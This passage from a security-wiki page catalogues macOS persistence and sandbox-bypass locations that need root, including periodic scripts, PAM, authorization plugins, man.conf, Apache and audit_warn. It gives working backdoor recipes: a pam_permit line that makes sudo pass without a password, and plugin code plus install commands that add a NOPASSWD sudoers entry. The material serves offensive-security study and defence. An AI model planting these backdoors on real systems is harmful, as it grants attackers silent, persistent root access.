<p>Finally <strong>build and copy your new <code>.mdimporter</code></strong> to one of thre previous locations and you can chech whenever it's loaded <strong>monitoring the logs</strong> or checking <strong><code>mdimport -L.</code></strong></p>
<h3 id="preference-pane"><a class="header" href="#preference-pane"><del>Preference Pane</del></a></h3>
<div class='notice notice-danger'><b>DANGER</b><br/>
It doesn't look like this is working anymore.
</div>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0009/">https://theevilbit.github.io/beyond/beyond_0009/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>It needs a specific user action</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-19"><a class="header" href="#location-19">Location</a></h4>
<ul>
<li><strong><code>/System/Library/PreferencePanes</code></strong></li>
<li><strong><code>/Library/PreferencePanes</code></strong></li>
<li><strong><code>~/Library/PreferencePanes</code></strong></li>
</ul>
<h4 id="description-5"><a class="header" href="#description-5">Description</a></h4>
<p>It doesn't look like this is working anymore.</p>
<h2 id="root-sandbox-bypass"><a class="header" href="#root-sandbox-bypass">Root Sandbox Bypass</a></h2>
<div class='notice notice-success'><b>SUCCESS</b><br/>
Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** being **root** and/or requiring other **weird conditions.**
</div>
<h3 id="periodic"><a class="header" href="#periodic">Periodic</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0019/">https://theevilbit.github.io/beyond/beyond_0019/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>But you need to be root</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-20"><a class="header" href="#location-20">Location</a></h4>
<ul>
<li><code>/etc/periodic/daily</code>, <code>/etc/periodic/weekly</code>, <code>/etc/periodic/monthly</code>, <code>/usr/local/etc/periodic</code>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: When the time comes</li>
</ul>
</li>
<li><code>/etc/daily.local</code>, <code>/etc/weekly.local</code> or <code>/etc/monthly.local</code>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: When the time comes</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-12"><a class="header" href="#description--exploitation-12">Description &amp; Exploitation</a></h4>
<p>The periodic scripts (<strong><code>/etc/periodic</code></strong>) are executed because of the <strong>launch daemons</strong> configured in <code>/System/Library/LaunchDaemons/com.apple.periodic*</code>. Note that scripts stored in <code>/etc/periodic/</code> are <strong>executed</strong> as the <strong>owner of the file,</strong> so this won't work for a potential privilege escalation.</p>
<pre><code class="language-bash"># Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
</code></pre>
<p>There are other periodic scripts that will be executed indicated in <strong><code>/etc/defaults/periodic.conf</code></strong>:</p>
<pre><code class="language-bash">grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
</code></pre>
<p>If you manage to write any of the files <code>/etc/daily.local</code>, <code>/etc/weekly.local</code> or <code>/etc/monthly.local</code> it will be <strong>executed sooner or later</strong>.</p>
<div class='notice notice-warning'><b>WARNING</b><br/>
Note that the periodic script will be **executed as the owner of the script**. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).
</div>
<h3 id="pam"><a class="header" href="#pam">PAM</a></h3>
<p>Writeup: <a href="../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.html">Linux Hacktricks PAM</a><br />
Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0005/">https://theevilbit.github.io/beyond/beyond_0005/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>But you need to be root</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-21"><a class="header" href="#location-21">Location</a></h4>
<ul>
<li>Root always required</li>
</ul>
<h4 id="description--exploitation-13"><a class="header" href="#description--exploitation-13">Description &amp; Exploitation</a></h4>
<p>As PAM is more focused in <strong>persistence</strong> and malware that on easy execution inside macOS, this blog won't give a detailed explanation, <strong>read the writeups to understand this technique better</strong>.</p>
<p>Check PAM modules with:</p>
<pre><code class="language-bash">ls -l /etc/pam.d
</code></pre>
<p>A persistence/privilege escalation technique abusing PAM is as easy as modifying the module /etc/pam.d/sudo adding at the beginning the line:</p>
<pre><code class="language-bash">auth       sufficient     pam_permit.so
</code></pre>
<p>So it will <strong>looks like</strong> something like this:</p>
<pre><code class="language-bash"># sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
</code></pre>
<p>And therefore any attempt to use <strong><code>sudo</code> will work</strong>.</p>
<div class='notice notice-danger'><b>DANGER</b><br/>
Note that this directory is protected by TCC so it's highly probably that the user will get a prompt asking for access.
</div>
<p>Another nice example is su, were you can see that it's also possible to give parameters to the PAM modules (and you coukd also backdoor this file):</p>
<pre><code class="language-bash">cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
</code></pre>
<h3 id="authorization-plugins"><a class="header" href="#authorization-plugins">Authorization Plugins</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0028/">https://theevilbit.github.io/beyond/beyond_0028/</a><br />
Writeup: <a href="https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65">https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>But you need to be root and make extra configs</li>
</ul>
</li>
<li>TCC bypass: ???</li>
</ul>
<h4 id="location-22"><a class="header" href="#location-22">Location</a></h4>
<ul>
<li><code>/Library/Security/SecurityAgentPlugins/</code>
<ul>
<li>Root required</li>
<li>It's also needed to configure the authorization database to use the plugin</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-14"><a class="header" href="#description--exploitation-14">Description &amp; Exploitation</a></h4>
<p>You can create an authorization plugin that will be executed when a user logs-in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).</p>
<pre><code class="language-objectivec">// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import &lt;Foundation/Foundation.h&gt;

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /etc/sudoers");
}
</code></pre>
<p><strong>Move</strong> the bundle to the location to be loaded:</p>
<pre><code class="language-bash">cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
</code></pre>
<p>Finally add the <strong>rule</strong> to load this Plugin:</p>
<pre><code class="language-bash">cat &gt; /tmp/rule.plist &lt;&lt;EOF
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
            &lt;key&gt;class&lt;/key&gt;
            &lt;string&gt;evaluate-mechanisms&lt;/string&gt;
            &lt;key&gt;mechanisms&lt;/key&gt;
            &lt;array&gt;
                &lt;string&gt;CustomAuth:login,privileged&lt;/string&gt;
            &lt;/array&gt;
        &lt;/dict&gt;
&lt;/plist&gt;
EOF

security authorizationdb write com.asdf.asdf &lt; /tmp/rule.plist
</code></pre>
<p>The <strong><code>evaluate-mechanisms</code></strong> will tell the authorization framework that it will need to <strong>call an external mechanism for authorization</strong>. Moreover, <strong><code>privileged</code></strong> will make it be executed by root.</p>
<p>Trigger it with:</p>
<pre><code class="language-bash">security authorize com.asdf.asdf
</code></pre>
<p>And then the <strong>staff group should have sudo</strong> access (read <code>/etc/sudoers</code> to confirm).</p>
<h3 id="manconf"><a class="header" href="#manconf">Man.conf</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0030/">https://theevilbit.github.io/beyond/beyond_0030/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>But you need to be root and the user must use man</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-23"><a class="header" href="#location-23">Location</a></h4>
<ul>
<li><strong><code>/private/etc/man.conf</code></strong>
<ul>
<li>Root required</li>
<li><strong><code>/private/etc/man.conf</code></strong>: Whenever man is used</li>
</ul>
</li>
</ul>
<h4 id="description--exploit-3"><a class="header" href="#description--exploit-3">Description &amp; Exploit</a></h4>
<p>The config file <strong><code>/private/etc/man.conf</code></strong> indicate the binary/script to use when opening man documentation files. So the path to the executable could be modified so anytime the user uses man to read some docs a backdoor is executed.</p>
<p>For example set in <strong><code>/private/etc/man.conf</code></strong>:</p>
<pre><code>MANPAGER /tmp/view
</code></pre>
<p>And then create <code>/tmp/view</code> as:</p>
<pre><code class="language-bash">#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
</code></pre>
<h3 id="apache2"><a class="header" href="#apache2">Apache2</a></h3>
<p><strong>Writeup</strong>: <a href="https://theevilbit.github.io/beyond/beyond_0023/">https://theevilbit.github.io/beyond/beyond_0023/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>But you need to be root and apache needs to be running</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a>
<ul>
<li>Httpd doesn't have entitlements</li>
</ul>
</li>
</ul>
<h4 id="location-24"><a class="header" href="#location-24">Location</a></h4>
<ul>
<li><strong><code>/etc/apache2/httpd.conf</code></strong>
<ul>
<li>Root required</li>
<li>Trigger: When Apache2 is started</li>
</ul>
</li>
</ul>
<h4 id="description--exploit-4"><a class="header" href="#description--exploit-4">Description &amp; Exploit</a></h4>
<p>You can indicate in <code>/etc/apache2/httpd.conf</code> to load a module adding a line such as:</p>
<pre><code class="language-bash">LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
</code></pre>
<p>This way your compiled moduled will be loaded by Apache. The only thing is that either you need to <strong>sign it with a valid Apple certificate</strong>, or you need to <strong>add a new trusted certificate</strong> in the system and <strong>sign it</strong> with it.</p>
<p>Then, if needed , to make sure the server will be started you could execute:</p>
<pre><code class="language-bash">sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
</code></pre>
<p>Code example for the Dylb:</p>
<pre><code class="language-objectivec">#include &lt;stdio.h&gt;
#include &lt;syslog.h&gt;

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
</code></pre>
<h3 id="bsm-audit-framework"><a class="header" href="#bsm-audit-framework">BSM audit framework</a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0031/">https://theevilbit.github.io/beyond/beyond_0031/</a></p>
<ul>
<li>Useful to bypass sandbox: <a href="https://emojipedia.org/large-orange-circle">🟠</a>
<ul>
<li>But you need to be root, auditd be running and cause a warning</li>
</ul>
</li>
<li>TCC bypass: <a href="https://emojipedia.org/large-red-circle">🔴</a></li>
</ul>
<h4 id="location-25"><a class="header" href="#location-25">Location</a></h4>
<ul>
<li><strong><code>/etc/security/audit_warn</code></strong>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: When auditd detects a warning</li>
</ul>
</li>
</ul>
<h4 id="description--exploit-5"><a class="header" href="#description--exploit-5">Description &amp; Exploit</a></h4>
<p>Whenever auditd detects a warning the script <strong><code>/etc/security/audit_warn</code></strong> is <strong>executed</strong>. So you could add your payload on it.</p>
<pre><code class="language-bash">echo "touch /tmp/auditd_warn" &gt;&gt; /etc/security/audit_warn
</code></pre>
<p>You could force a warning with <code>sudo audit -n</code>.</p>
<h3 id="startup-items"><a class="header" href="#startup-items">Startup Items</a></h3>
<div class='notice notice-danger'><b>DANGER</b><br/>
**This is deprecated, so nothing should be found in those directories.**
</div>
<p>The <strong>StartupItem</strong> is a directory that should be positioned within either <code>/Library/StartupItems/</code> or <code>/System/Library/StartupItems/</code>. Once this directory is established, it must encompass two specific files:</p>
<ol>
<li>An <strong>rc script</strong>: A shell script executed at startup.</li>
<li>A <strong>plist file</strong>, specifically named <code>StartupParameters.plist</code>, which contains various configuration settings.</li>
</ol>
<p>Ensure that both the rc script and the <code>StartupParameters.plist</code> file are correctly placed inside the <strong>StartupItem</strong> directory for the startup process to recognize and utilize them.</p>
<p><code>StartupParameters.plist</code></p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;Description&lt;/key&gt;
        &lt;string&gt;This is a description of this service&lt;/string&gt;
    &lt;key&gt;OrderPreference&lt;/key&gt;
        &lt;string&gt;None&lt;/string&gt; &lt;!--Other req services to execute before this --&gt;
    &lt;key&gt;Provides&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;superservicename&lt;/string&gt; &lt;!--Name of the services provided by this file --&gt;
    &lt;/array&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p><code>superservicename</code></p>
<pre><code class="language-bash">#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
</code></pre>
<h3 id="emond"><a class="header" href="#emond"><del>emond</del></a></h3>
<div class='notice notice-danger'><b>DANGER</b><br/>
I cannot find this component in my macOS so for more info check the writeup
</div>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0023/">https://theevilbit.github.io/beyond/beyond_0023/</a></p>
<p>Introduced by Apple, <strong>emond</strong> is a logging mechanism that seems to be underdeveloped or possibly abandoned, yet it remains accessible. While not particularly beneficial for a Mac administrator, this obscure service could serve as a subtle persistence method for threat actors, likely unnoticed by most macOS admins.</p>
<p>For those aware of its existence, identifying any malicious usage of <strong>emond</strong> is straightforward. The system's LaunchDaemon for this service seeks scripts to execute in a single directory. To inspect this, the following command can be used:</p>
<pre><code class="language-bash">ls -l /private/var/db/emondClients
</code></pre>
<h3 id="xquartz"><a class="header" href="#xquartz"><del>XQuartz</del></a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0018/">https://theevilbit.github.io/beyond/beyond_0018/</a></p>
<h4 id="location-26"><a class="header" href="#location-26">Location</a></h4>
<ul>
<li><strong><code>/opt/X11/etc/X11/xinit/privileged_startx.d</code></strong>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: With XQuartz</li>
</ul>
</li>
</ul>
<h4 id="description--exploit-6"><a class="header" href="#description--exploit-6">Description &amp; Exploit</a></h4>
<p>XQuartz is <strong>no longer installed in macOS</strong>, so if you want more info check the writeup.</p>
<h3 id="kext"><a class="header" href="#kext"><del>kext</del></a></h3>
<div class='notice notice-danger'><b>DANGER</b><br/>
It's so complicated to install kext even as root taht I won't consider this to escape from sandboxes or even for persistence (unless you have an exploit)
</div>
<h4 id="location-27"><a class="header" href="#location-27">Location</a></h4>
<p>In order to install a KEXT as a startup item, it needs to be <strong>installed in one of the following locations</strong>:</p>
<ul>
<li><code>/System/Library/Extensions</code>
<ul>
<li>KEXT files built into the OS X operating system.</li>
</ul>
</li>
<li><code>/Library/Extensions</code>
<ul>
<li>KEXT files installed by 3rd party software</li>
</ul>
</li>
</ul>
<p>You can list currently loaded kext files with:</p>
<pre><code class="language-bash">kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
</code></pre>
<p>For more information about <a href="macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers"><strong>kernel extensions check this section</strong></a>.</p>
<h3 id="amstoold"><a class="header" href="#amstoold"><del>amstoold</del></a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0029/">https://theevilbit.github.io/beyond/beyond_0029/</a></p>
<h4 id="location-28"><a class="header" href="#location-28">Location</a></h4>
<ul>
<li><strong><code>/usr/local/bin/amstoold</code></strong>
<ul>
<li>Root required</li>
</ul>
</li>
</ul>
<h4 id="description--exploitation-15"><a class="header" href="#description--exploitation-15">Description &amp; Exploitation</a></h4>
<p>Apparently the <code>plist</code> from <code>/System/Library/LaunchAgents/com.apple.amstoold.plist</code> was using this binary while exposing a XPC service... the thing is that the binary didn't exist, so you could place something there and when the XPC service gets called your binary will be called.</p>
<p>I can no longer find this in my macOS.</p>
<h3 id="xsanctl"><a class="header" href="#xsanctl"><del>xsanctl</del></a></h3>
<p>Writeup: <a href="https://theevilbit.github.io/beyond/beyond_0015/">https://theevilbit.github.io/beyond/beyond_0015/</a></p>
<h4 id="location-29"><a class="header" href="#location-29">Location</a></h4>
<ul>
<li><strong><code>/Library/Preferences/Xsan/.xsanrc</code></strong>
<ul>
<li>Root required</li>
<li><strong>Trigger</strong>: When the service is run (rarely)</li>
</ul>
</li>
</ul>
<h4 id="description--exploit-7"><a class="header" href="#description--exploit-7">Description &amp; exploit</a></h4>
<p>Apparently it's not very common to run this script and I couldn't even find it in my macOS, so if you want more info check the writeup.</p>
<h3 id="etcrccommon"><a class="header" href="#etcrccommon"><del>/etc/rc.common</del></a></h3>
<div class='notice notice-danger'><b>DANGER</b><br/>
**This isn't working in modern MacOS versions**
</div>
<p>It's also possible to place here <strong>commands that will be executed at startup.</strong> Example os regular rc.common script:</p>
<pre><code class="language-bash">#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] &amp;&amp; [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2&gt;/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2&gt; /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
</code></pre>
<h2 id="persistence-techniques-and-tools"><a class="header" href="#persistence-techniques-and-tools">Persistence techniques and tools</a></h2>
<ul>
<li><a href="https://github.com/cedowens/Persistent-Swift">https://github.com/cedowens/Persistent-Swift</a></li>
<li><a href="https://github.com/D00MFist/PersistentJXA">https://github.com/D00MFist/PersistentJXA</a></li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../macos-hardening/macos-useful-commands.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../windows-hardening/checklist-windows-privilege-escalation.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../macos-hardening/macos-useful-commands.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../windows-hardening/checklist-windows-privilege-escalation.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->
        <script src="../js/custom.js"></script>


    </div>
    </body>
</html>
